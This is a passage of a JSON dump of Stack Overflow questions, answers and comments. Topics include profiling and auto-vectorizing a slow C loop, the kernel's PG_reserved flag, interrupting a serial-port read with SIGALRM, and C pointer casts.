"https://stackoverflow.com/users/23771/mike-dunlavey"}, "edited": false, "score": 0, "creation_date": 1461861731, "post_id": 36893556, "comment_id": 61402991, "body": "I share your skepticism of the results. If <i>oprofile</i> is like other profilers, you might just get a second opinion. As a sanity check, you might try <a href=\"http://stackoverflow.com/a/378024/23771\"><i>this</i></a>, for which there&#39;s a video <a href=\"https://www.youtube.com/watch?v=xPg3sRpdW1U\" rel=\"nofollow noreferrer\"><i>here</i></a>. And do it <i>without compiler optimization</i>. First tune its guts out manually, then let the optimizer try to shave cycles by scrambling the code. That code-scrambling messes up any tool that deals with lines of source code."}], "answers": [{"comments": [{"owner": {"reputation": 2077, "user_id": 1071669, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/701fc95be1eaf05adaccd367ba33ec9b?s=128&d=identicon&r=PG", "display_name": "dargaud", "link": "https://stackoverflow.com/users/1071669/dargaud"}, "edited": false, "score": 0, "creation_date": 1461852666, "post_id": 36903517, "comment_id": 61396373, "body": "Thanks. See my additions on the original post."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 2077, "user_id": 1071669, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/701fc95be1eaf05adaccd367ba33ec9b?s=128&d=identicon&r=PG", "display_name": "dargaud", "link": "https://stackoverflow.com/users/1071669/dargaud"}, "edited": false, "score": 0, "creation_date": 1461857500, "post_id": 36903517, "comment_id": 61400193, "body": "@dargaud: updated my answer with an example of how to write it with an array of structs, and several other updates."}, {"owner": {"reputation": 2077, "user_id": 1071669, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/701fc95be1eaf05adaccd367ba33ec9b?s=128&d=identicon&r=PG", "display_name": "dargaud", "link": "https://stackoverflow.com/users/1071669/dargaud"}, "edited": false, "score": 0, "creation_date": 1461937212, "post_id": 36903517, "comment_id": 61438740, "body": "Woah, thanks for all the details (particularly about Clang reports). It&#39;s going to be at least a month before I work on this again, but will post results then."}], "tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": false, "score": 3, "last_activity_date": 1461857440, "last_edit_date": 1592644375, "creation_date": 1461805848, "answer_id": 36903517, "question_id": 36893556, "link": "https://stackoverflow.com/questions/36893556/optimizing-a-slow-loop/36903517#36903517", "title": "Optimizing a slow loop", "body": "<blockquote>\n<p>My first question is: can I rely on oprofile to indicate the proper\nplace where the code is slow</p>\n</blockquote>\n<p>Not precisely.  As I understand it, cycles often get charged to the instruction that's waiting for inputs (or some other execution resource), not the instruction that's slow to produce inputs or free up whatever other execution resource.</p>\n<p>However, in your oprofile output, it's probable that it's actually that final loop.  Are there other inner loops inside this outer loop?</p>\n<p>Did you profile cache misses?  There are counters for many interesting things besides cycles.</p>\n<p>Also note that to really understand the performance, you need to look at profile annotations on the asm, not the C.  e.g. it's weird that one add accounts for more of the time than the other, but that's probably just an issue of mapping insns to source lines.</p>\n<hr />\n<h3>re: perf results from commenting out the loop:</h3>\n<p>So the program doesn't run any faster at all without that inner loop?  If the outer loop already touched that memory, maybe you're just bottlenecked on cache misses, and the inner loop was just touching that memory again?  Try <code>perf record -e L1-dcache-load-misses ./a.out</code> then <code>perf report</code>.  Or the <code>oprofile</code> equivalent.</p>\n<p>Maybe the inner-loop uops were stuck waiting to issue until slow stuff in the outer loop retired.  The ReOrder Buffer (ROB) size in modern Intel CPUs is around 200 uops, and most insns decode to a single uop, so the out-of-order window is around 200 instructions.</p>\n<p>Commenting out that inner loop also means that any loop-carried dependency chains in the outer loop don't have time to complete while the inner loop is running.  Removing that inner loop could produce a qualitative change in the bottleneck for the outer loop, from throughput to latency.</p>\n<hr />\n<p>re: 15x faster with <code>-Ofast -march=native</code>.  Ok, that's good.  un-optimized code is <em>horrible</em>, and shouldn't be considered any kind of &quot;baseline&quot; or anything for performance.  If you want to compare with something, compare with <code>-O2</code> (doesn't include auto-vectorization, <code>-ffast-math</code>, or <code>-march=native</code>).</p>\n<p>Try using <code>-fprofile-generate</code> / <code>-fprofile-use</code>.  profile-use includes <code>-funroll-loops</code>, so I assume that option works best when there is profiling data available.</p>\n<h3>re: auto-parallelization:</h3>\n<p>You have to enable that specifically, either with OpenMP pragmas or with <a href=\"https://gcc.gnu.org/wiki/AutoParInGCC\" rel=\"nofollow noreferrer\">gcc options</a> like <code>-floop-parallelize-all -ftree-parallelize-loops=4</code>.  Auto-parallelization may not be possible if there are non-trivial loop-carried dependencies.  That wiki page is old, too, and might not reflect the state-of-the-art in auto-parallelization.  I think OpenMP hints about which loops to parallelize are a more sane way to go than having the compiler guess, esp. without <code>-fprofile-use</code>.</p>\n<hr />\n<blockquote>\n<p>I tried with Clang and the gains were slight (a few seconds), but I do not see an option to get an optimization report such as -fopt-info. Do I have to look at the assembly as the only option to know what's going on ?</p>\n</blockquote>\n<p>The <a href=\"http://clang.llvm.org/docs/UsersManual.html#options-to-emit-optimization-reports\" rel=\"nofollow noreferrer\">clang manual says</a> you can use <code>clang -Rpass=inline</code> for a report on inlining.  <a href=\"http://llvm.org/docs/Vectorizers.html#diagnostics\" rel=\"nofollow noreferrer\">The llvm docs say</a> that the name for the vectorization pass is <code>loop-vectorize</code>, so you can use <code>-Rpass-missed=loop-vectorize</code>, or <code>-Rpass-analysis=loop-vectorize</code> to tell you which statement caused vectorization to fail.</p>\n<p>Looking at the asm is the only way to know whether it auto-vectorized <em>badly</em> or not, but to really judge the compiler's work you have to know how to write efficient asm yourself (so you know approximately what it could have done.)  See <a href=\"http://agner.org/optimize/\" rel=\"nofollow noreferrer\">http://agner.org/optimize/</a>, and other links in the <a href=\"/questions/tagged/x86\" class=\"post-tag\" title=\"show questions tagged &#39;x86&#39;\" rel=\"tag\">x86</a> tag wiki.</p>\n<p>I didn't try putting your code on <a href=\"http://gcc.godbolt.org/\" rel=\"nofollow noreferrer\">http://gcc.godbolt.org/</a> to try it with different compilers, but you could post a link if your example makes asm that's representative of what you see from the full source.</p>\n<hr />\n<h3>Auto-vectorization</h3>\n<pre><code>for(k=0; k&lt; 100; k++ ) {\n        ddI += Table_derive(2,n_bol,k);\n        ddQ += Table_derive(3,n_bol,k);\n}\n</code></pre>\n<p>This should auto-vectorize, since 2 and 3 are consecutive elements.  You would get better cache locality (for this part) if you split up the table into multiple tables.  e.g. keep elements 2 and 3 of each group of 5 in one array.  Group other elements that are used together into tables.  (If there's overlap, e.g. another loop needs elements 1 and 3, then maybe split up the one that can't auto-vectorize anyway?)</p>\n<p>re: question update: You don't need a struct-of-arrays for this to auto-vectorize with SSE.  A 16B vector holds exactly two <code>double</code>s, so the compiler can accumulate a vector of <code>[ ddI ddQ ]</code> with <code>addsd</code>.  With AVX 256b vectors, it would have to do a <code>vmovupd</code> / <code>vinsertf128</code> to get that pair of <code>double</code>s from adjacent structs, instead of a single 256b load, though, but not a big deal.  Memory locality is an issue, though; you're only using 2 out of every 5 <code>double</code>s in the cache lines you touch.</p>\n<hr />\n<p>It should probably auto-vectorize even without <code>-ffast-math</code>, as long as you're targeting a CPU with double-precision vectors.  (e.g. x86-64, or 32bit with <code>-msse2</code>).</p>\n<p>gcc likes to make big prologues for potentially-unaligned data, using scalar until it reaches an aligned address.  This leads to bloated code, esp. with 256b vectors and small elements.  It shouldn't be too bad with <code>double</code>, though.  Still, give clang 3.7 or clang 3.8 a try.  clang auto-vectorizes potentially-unaligned accesses with unaligned loads, which have no extra cost when the data is aligned at runtime.  (gcc optimizes for the hopefully-rare case where the data isn't aligned, because unaligned loads/store instructions were slower on old CPUs (e.g. Intel pre-Nehalem) even when used on aligned data.)</p>\n<hr />\n<p>your <code>char</code> array may be defeating the auto-vectorizer, if it can't prove that each <code>double</code> is even 8B-aligned.  Like @JohnBollinger commented, that's really ugly.  If you have an array of structs of 5 doubles, declare it that way!</p>\n<h2>How to write it as an array of structs:</h2>\n<p>Keep the &quot;manual&quot; multidimensional indexing, but make the base 1D array an array of <code>double</code>, or better of a <code>struct</code> type, so the compiler will assume every <code>double</code> is 8B-aligned.</p>\n<p>Your original version also referenced the global <code>Buffer_temp</code> for every access to the array.  (Or was it a local?)  Any store that might alias it would require re-loading the base pointer.  (C's aliasing rules allow <code>char*</code> to alias anything, but I think your cast to a <code>double*</code> before dereferencing saves you from that.  You're not storing to the array inside the inner loop anyway, but I assume you are in the outer array.)</p>\n<pre><code>typedef struct table_derive_entry {\n    double a,b,c,d,e;\n} derive_t;\n\nvoid foo(void)\n{\n    // I wasn't clear on whether table is static/global, or per-call scratch space.\n    derive_t *table = aligned_alloc(foo*bar*sizeof(derive_t), 64);            // or just malloc, or C99 variable size array.\n\n    // table += offset/sizeof(table[0]);   // if table is global and offset is fixed within one call...\n\n// maybe make offset a macro arg, too?\n#define Table_derive(nbol, pos)     table[offset/sizeof(derive_t) + (pos) + _interval_derive_dIdQ / sizeof(derive_t) * (nbol))]\n\n\n    // ...        \n    for(k=0; k&lt; 100; k++ ) {\n         ddI += Table_derive(n_bol, k).b;\n         ddQ += Table_derive(n_bol, k).c;\n    }\n    // ...\n}\n#undef Table_derive\n</code></pre>\n<p>If <code>_interval_derive_dIdQ</code> and <code>offset</code> aren't always multiples of 5 * 8B, then you may need to declare <code>double *table = ...;</code> and modify your Table_derive to something like</p>\n<pre><code>#define Table_derive(nbol, pos)   ( ((derive_t *)(double_table + offset/sizeof(double) + _interval_derive_dIdQ / sizeof(double) * (nbol)))[pos] )\n</code></pre>\n<hr />\n<h3>FP division:</h3>\n<pre><code>ddI /= _interval_derive_dIdQ;\nddQ /= _interval_derive_dIdQ;\n</code></pre>\n<p>Can you hoist <code>double inv_interval_derive_dIdQ = 1.0 / _interval_derive_dIdQ;</code> out of the loop?  Multiply is significantly cheaper than divide, esp. if latency matters or the div unit is also needed for sqrt.</p>\n"}], "owner": {"reputation": 2077, "user_id": 1071669, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/701fc95be1eaf05adaccd367ba33ec9b?s=128&d=identicon&r=PG", "display_name": "dargaud", "link": "https://stackoverflow.com/users/1071669/dargaud"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 740, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1461857440, "creation_date": 1461769004, "last_edit_date": 1461852618, "question_id": 36893556, "link": "https://stackoverflow.com/questions/36893556/optimizing-a-slow-loop", "title": "Optimizing a slow loop", "body": "<p>The code looks like this and the inner loop takes a huge amount of time:</p>\n\n<pre><code>#define _table_derive                  ((double*)(Buffer_temp + offset))\n#define Table_derive(m,nbol,pos)        _table_derive[(m) + 5*((pos) + _interval_derive_dIdQ * (nbol))]\nchar *Buffer_temp=malloc(...);\n\nfor (n_bol=0; n_bol&lt;1400; n_bol++)  // long loop here\n    [lots of code here, hundreds of lines with computations on doubles, other loops, etc]\n\n    double ddI=0, ddQ=0;\n\n    // This is the original code\n    for(k=0; k&lt; 100; k++ ) {\n            ddI += Table_derive(2,n_bol,k);\n            ddQ += Table_derive(3,n_bol,k);\n    }\n    ddI /= _interval_derive_dIdQ;\n    ddQ /= _interval_derive_dIdQ;\n    [more code here]\n}\n</code></pre>\n\n<p>oprofile tells me that most of the runtime is spent here (2nd column is % of time):</p>\n\n<pre><code>129304  7.6913 :for(k=0; k&lt; 100; k++) {\n275831 16.4070 :ddI += Table_derive(2,n_bol,k);\n764965 45.5018 :ddQ += Table_derive(3,n_bol,k);\n</code></pre>\n\n<p>My first question is: can I rely on oprofile to indicate the proper place where the code is slow (I tried in -Og and -Ofast and it's basically the same).</p>\n\n<p>My second question is: how come this very simple loop is slower than sqrt, atan2 and the many hundred lines of computations that come before ? I know I'm not showing all the code, but there's lots of it and it doesn't make sense to me.</p>\n\n<p>I've tried various optimizer tricks to either vectorize (doesn't work) or unroll (works) but for little gain, for instance:</p>\n\n<pre><code>    typedef double aligned_double __attribute__((aligned(8)));\n    typedef const aligned_double* SSE_PTR;\n    SSE_PTR TD=(SSE_PTR)&amp;Table_derive(2,n_bol,0);   // We KNOW the alignement is correct because offset is multiple of 8\n\n    for(k=0; k&lt; 100; k++, TD+=5) {\n        #pragma Loop_Optimize Unroll No_Vector\n        ddI += TD[0];\n        ddQ += TD[1];\n    }\n</code></pre>\n\n<p>I've checked the output of the optimizer:\n\"-Ofast -g -march=native -fopt-info-all=missed.info -funroll-loops\"\nand in this case I get \"loop unrolled 9 times\", but if I try to vectorize, I get (in short): \n\"can't force alignment of ref\", \n\"vector alignment may not be reachable\", \n\"Vectorizing an unaligned access\", \n\"Unknown alignment for access: *(prephitmp_3784 + ((sizetype) _1328 + (long unsigned int) (n_bol_1173 * 500) * 2) * 4)\"</p>\n\n<p>Any way to speed this up ?</p>\n\n<p>ADDENDUM:\nThanks all for the comments, I'll try to answer here:</p>\n\n<ul>\n<li>yes, I know the code is ugly (it's not mine), and you haven't seen the actual original (that's a huge simplification)</li>\n<li>I'm stuck with this array as the C code is in a library and the large array, once processed and modified by the C, gets passed onto the caller (either IDL, Python or C).</li>\n<li>I know it would be better using some strucs instead of casting char* to complicated multidimensional double*, but see above. Structs may not have been parts of C specs when this prog was first written (just kidding... maybe)</li>\n<li>I know that for the vectorizer it's better to have structs of arrays than arrays of struct, but, sigh... see above.</li>\n<li>there's an actual outer loop (in the calling program), so that the total size of this monolithic array is around 2Gb</li>\n<li>as is, it takes about 15 minutes to run with no optimization, and one minute after I rewrote some code (faster atan2, some manual aligns inside the array ...) and I used -Ofast and -march=native</li>\n<li>Due to constraints changes in the hardware, I'm trying to go faster to keep up with dataflow.</li>\n<li>I tried with Clang and the gains were slight (a few seconds), but I do not see an option to get an optimization report such as -fopt-info. Do I have to look at the assembly as the only option to know what's going on ?</li>\n<li>the system is a beastly 64-core with 500Gb of RAM, but I haven't been able to insert any OpenMP pragmas to parallelize the above code (I've tried): it reads a file, decompresses it entirely in memory (2Gb), analyses it in sequence (things like '+=') and spits out some results to the calling IDL/Python. All on a single core (but the other cores are quite busy with the actual acquisition and post processing).  :(</li>\n<li>Useless, thanks for the excellent suggestion: removing ddQ += ... seems to transfer the % of time to the previous line: 376280 39.4835:ddI+=...</li>\n<li>which brings us to even better: removing both (hence the entire loop) saves... nothing at all !!! So I guess as Peter said, I can't trust the profiler. If I profile the loopless prog, I get timings more evenly spread out (previously 3 lines only above 1s, now about 10, all nonsensical like simple variables assign). </li>\n</ul>\n\n<p>I guess that inner loop was a red herring from the start; I'll restart my optimization using manual timings. Thanks.</p>\n"}, {"tags": ["c", "linux-kernel", "linux-device-driver"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461769119, "post_id": 36893456, "comment_id": 61351345, "body": "For back compatibility?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461769249, "post_id": 36893456, "comment_id": 61351445, "body": "Perhaps google the question title? <a href=\"https://lwn.net/Articles/161204/\" rel=\"nofollow noreferrer\">For example this</a> or an <a href=\"http://lwn.net/Articles/162860/\" rel=\"nofollow noreferrer\">updated version</a>."}, {"owner": {"reputation": 119, "user_id": 978399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/884a4c3f5f67f5eb01659e27fee0de70?s=128&d=identicon&r=PG", "display_name": "jada12276", "link": "https://stackoverflow.com/users/978399/jada12276"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461769742, "post_id": 36893456, "comment_id": 61351786, "body": "@WeatherVane Ironically, I actually had the <a href=\"http://lwn.net/Articles/162860/\" rel=\"nofollow noreferrer\">updated version</a> in my question. The article says and I quote: <i>This function (vm_insert_page) inserts the given page into vma, mapped at the given address. It does not put out warnings, and does not require that PG_reserved be set</i>"}, {"owner": {"reputation": 119, "user_id": 978399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/884a4c3f5f67f5eb01659e27fee0de70?s=128&d=identicon&r=PG", "display_name": "jada12276", "link": "https://stackoverflow.com/users/978399/jada12276"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461769950, "post_id": 36893456, "comment_id": 61351956, "body": "@LPs Can you give an example (or where it is stated to be kept for backward compatibility?). It would really help me catch where it is still used. I am not much into the device drivers though."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461770267, "post_id": 36893456, "comment_id": 61352215, "body": "@jada12276 oops sorry, I suppose it is still there so that legacy code will compile."}, {"owner": {"reputation": 119, "user_id": 978399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/884a4c3f5f67f5eb01659e27fee0de70?s=128&d=identicon&r=PG", "display_name": "jada12276", "link": "https://stackoverflow.com/users/978399/jada12276"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461770953, "post_id": 36893456, "comment_id": 61352750, "body": "@WeatherVane I can understand that it exists to support legacy code. But, this means the kernel actually uses this flag for checks. I just need a good pointer on how it is used by the kernel."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1461771322, "post_id": 36893456, "comment_id": 61353012, "body": "You could find it in <a href=\"http://lxr.free-electrons.com/source/mm/page_alloc.c\" rel=\"nofollow noreferrer\">page_alloc.c</a>. At line 746 you could see <code>PAGE_FLAGS_CHECK_AT_FREE</code> usage. That define could be found into <a href=\"http://lxr.free-electrons.com/source/include/linux/page-flags.h\" rel=\"nofollow noreferrer\">page-flags.h</a> at line 653."}, {"owner": {"reputation": 119, "user_id": 978399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/884a4c3f5f67f5eb01659e27fee0de70?s=128&d=identicon&r=PG", "display_name": "jada12276", "link": "https://stackoverflow.com/users/978399/jada12276"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461772492, "post_id": 36893456, "comment_id": 61353925, "body": "@LPs ahan, so the kernel does not allow such a page to be freed. Which is all that remains to this flag. Thanks a lot!!"}], "owner": {"reputation": 119, "user_id": 978399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/884a4c3f5f67f5eb01659e27fee0de70?s=128&d=identicon&r=PG", "display_name": "jada12276", "link": "https://stackoverflow.com/users/978399/jada12276"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 393, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1461768785, "creation_date": 1461768785, "question_id": 36893456, "link": "https://stackoverflow.com/questions/36893456/why-does-pg-reserved-flag-still-exist-in-linux-kernel", "title": "Why does PG_reserved flag still exist in linux kernel?", "body": "<p>The <code>PG_reserved</code> flag was obsoleted way back in <a href=\"http://lwn.net/Articles/162860/\" rel=\"nofollow\">2005</a>, but still exists in the <a href=\"http://lxr.free-electrons.com/source/include/linux/page-flags.h\" rel=\"nofollow\">kernel</a>. And the Internet seems oblivious of the true reason of its existence. Can someone please explain what it does and why is it still in the kernel code?</p>\n"}, {"tags": ["c", "serial-port"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461768637, "post_id": 36892804, "comment_id": 61350951, "body": "Time to strat learning something about <a href=\"http://www.tutorialspoint.com/cplusplus/cpp_multithreading.htm\" rel=\"nofollow noreferrer\">MultiThreading</a>"}, {"owner": {"reputation": 32308, "user_id": 20270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37335856df5e5e73d82bca5a805bd647?s=128&d=identicon&r=PG", "display_name": "Hasturkun", "link": "https://stackoverflow.com/users/20270/hasturkun"}, "edited": false, "score": 0, "creation_date": 1461768762, "post_id": 36892804, "comment_id": 61351044, "body": "Well, one way is to <code>siglongjmp()</code> out, though <code>read()</code> should return if you didn&#39;t set <code>SA_RESTART</code> (which you did not). As an aside, do you have multiple threads by any chance?"}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1461769022, "post_id": 36892804, "comment_id": 61351254, "body": "Yeah, this bothers me a lot (the fact I have not set the SA_RESTART flag). I was thinking that maybe some settings in termios set it on? I do have multiple threads"}, {"owner": {"reputation": 32308, "user_id": 20270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37335856df5e5e73d82bca5a805bd647?s=128&d=identicon&r=PG", "display_name": "Hasturkun", "link": "https://stackoverflow.com/users/20270/hasturkun"}, "edited": false, "score": 0, "creation_date": 1461769520, "post_id": 36892804, "comment_id": 61351639, "body": "If you have multiple threads, it&#39;s possible that the thread running <code>read()</code> isn&#39;t the one receiving the signal. Perhaps you should try using <code>pthread_sigmask()</code> to block the signal in other threads, only unblock it in your reader"}, {"owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "edited": false, "score": 0, "creation_date": 1461770891, "post_id": 36892804, "comment_id": 61352704, "body": "So does that mean I can&#39;t have multiple alarms on multiple threads???"}, {"owner": {"reputation": 32308, "user_id": 20270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37335856df5e5e73d82bca5a805bd647?s=128&d=identicon&r=PG", "display_name": "Hasturkun", "link": "https://stackoverflow.com/users/20270/hasturkun"}, "edited": false, "score": 0, "creation_date": 1461774628, "post_id": 36892804, "comment_id": 61355556, "body": "Not if they&#39;re all using the same signal, that would be confusing (as these are process wide signals, not thread specific. You could use <code>timer_create()</code> an co to get a thread specific signal. Also, you could maybe use something like libev or similar to handle both timeouts and async I/O and hide those details."}], "owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 190, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1461767666, "creation_date": 1461767274, "last_edit_date": 1495541770, "question_id": 36892804, "link": "https://stackoverflow.com/questions/36892804/how-to-set-a-blocking-read-from-serial-port-which-will-break-on-sigalrm", "title": "How to set a blocking read from serial-port which will break on SIGALRM?", "body": "<p>Hi I am (unsuccesfully) trying to set this thing up, but there are so many flags, that I am getting lost in it. What I need to do is - </p>\n\n<ul>\n<li><p>open a serial port with specified baudrate, parity and stopbits.</p></li>\n<li><p>Do multiple reads and writes in specified amount of time (in<br>\nmiliseconds).</p></li>\n<li><p>If the time expires, start it again (with different data...). If the \ntime does not expire, sleep for the rest of the remaining time.</p></li>\n</ul>\n\n<p>This is what I have done so far:</p>\n\n<p>seting the serial port like this:</p>\n\n<pre><code>int serial_set_attributes(int terminal_file_descriptor, int speed, short int databits, short int stopbit, short int parity, short int RTS)\n{\n        struct termios tty;\n\n        memset (&amp;tty, 0, sizeof(tty));\n\n        if (tcgetattr (terminal_file_descriptor, &amp;tty) == 0)\n        {\n                cfsetospeed (&amp;tty, speed);\n                cfsetispeed (&amp;tty, speed);\n\n                /* test */\n\n\n                // disable IGNBRK for mismatched speed tests; otherwise receive break\n                // as \\000 chars\n                tty.c_iflag &amp;= ~IGNBRK;                             // ignore break signal\n                tty.c_iflag &amp;= ~(IXON | IXOFF | IXANY | ICRNL);     // shut off xon/xoff ctrl and mapping CR to NL on input.\n\n                tty.c_oflag = 0;                                    // no remapping, no delays\n\n                tty.c_cflag &amp;= ~CSIZE;\n                tty.c_cflag |= databits;\n                tty.c_cflag |= (CLOCAL | CREAD);                    // ignore modem controls,\n                tty.c_cflag &amp;= ~(PARENB | PARODD);\n                tty.c_cflag |= parity;\n                tty.c_cflag &amp;= ~CSTOPB;\n                //tty.c_cflag |= stopbit;\n                if (RTS)\n                        tty.c_cflag |= CRTSCTS;\n                else\n                        tty.c_cflag &amp;= ~CRTSCTS;\n\n                tty.c_lflag = 0;            // no signaling chars, no echo,\n                tty.c_cc[VMIN]  = 0;        // read doesn't block\n                tty.c_cc[VTIME] = 10;       // 0.5 seconds read timeout\n\n                if (tcsetattr (terminal_file_descriptor, TCSANOW, &amp;tty) == 0)\n                {\n                        return 0;\n                }\n        }\n        return -1;\n}\n</code></pre>\n\n<p>setting the alarm like this:</p>\n\n<pre><code>static volatile int g_alarm_flag=0;\nstatic void alarm_handler(int signum){\n    printf(\"alarm\\n\"); //I know I should not do this, just for debug\n    g_alarm_flag = 1;\n}\n\nint set_alarm(useconds_t interval){\n\n    struct sigaction sa = {.sa_handler = alarm_handler};\n    if (sigaction(SIGALRM, &amp;sa, NULL) == -1){perror(\"Cant set up signal handling on alarm\\n\");exit(1);}\n    g_alarm_flag = 0;\n    struct itimerval it_val;\n    it_val.it_value.tv_sec =     interval/1000000;\n    it_val.it_value.tv_usec =    interval % 1000000;   \n    it_val.it_interval = it_val.it_value; \n    if (setitimer(ITIMER_REAL, &amp;it_val, NULL) == -1) {\n        perror(\"error calling setitimer()\");\n        exit(1);\n    }\n    return 0; \n}\n</code></pre>\n\n<p>and starting the program like this:</p>\n\n<pre><code>int output_fd = open(OUTPUT,O_RDWR | O_NOCTTY);\nif (output_fd &lt; 0){perror(\"Cant open a serial port\");\n//    exit(1);\n}\nset_alarm(60000);\nserial_set_attributes(output_fd, BAUDRATE, CS8, 1, 0, 0);\nprintf(\"here63\\n\");\nchar a;\nprintf(\"%d\\n\",(int)read(output_fd,&amp;a,1));\n</code></pre>\n\n<p>With this setup, the alarm doesn't interrupt the <code>read()</code> only the time in VTIME flag does.\nI can't use <code>select()</code>, because I need to do multiple operations in desired time. The <code>read()</code> on the last line of the code returns 0 (when there is nothing on the line). My solution <a href=\"https://stackoverflow.com/questions/36871256/c-blocking-read-for-an-exact-amout-of-bytes-for-an-exact-amount-of-time\">here</a> was kinda hated...\nMy system is Linux mint 64-bit, using gcc.</p>\n"}, {"tags": ["c", "pointers", "casting", "constants"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461767373, "post_id": 36892583, "comment_id": 61349882, "body": "There is no section <code>6.3.16</code>, less a <code>.1</code> in the standard. What ever you use as reference is not ISO9899."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461767490, "post_id": 36892583, "comment_id": 61349967, "body": "Never use casts if 1) they are not absolutely required or 2) you don&#39;t understand <b>all</b> implications of the cast or 3) you don&#39;t accept them completely. So, <b>why</b> do you use that cast?"}, {"owner": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 0, "creation_date": 1461767517, "post_id": 36892583, "comment_id": 61349986, "body": "It&#39;s section <code>6.5.16.1&#47;1</code> (C99)"}, {"owner": {"reputation": 11381, "user_id": 